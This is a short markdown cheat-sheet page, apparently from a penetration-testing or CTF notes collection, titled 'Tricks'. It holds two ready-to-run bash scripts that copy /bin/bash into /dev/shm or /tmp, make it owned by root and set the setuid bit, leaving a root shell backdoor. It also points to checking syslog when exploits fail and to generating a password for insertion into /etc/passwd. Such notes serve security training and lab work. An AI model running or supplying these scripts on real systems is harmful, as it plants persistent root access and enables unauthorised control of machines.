# Tricks

Checking `syslog` is particularly useful when exploits dont work as intended

Living in `/dev/shm/` (`/dev/shm` is RAM)

```bash
#!/bin/bash
cp /bin/bash /dev/shm/bash
chown root:root /dev/shm/bash
chmod u+s /dev/shm/bash
```

Living in `/tmp/`

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```

Generate a password for `/etc/passwd` with [openssl](../Tools/Encryption/openssl.md)
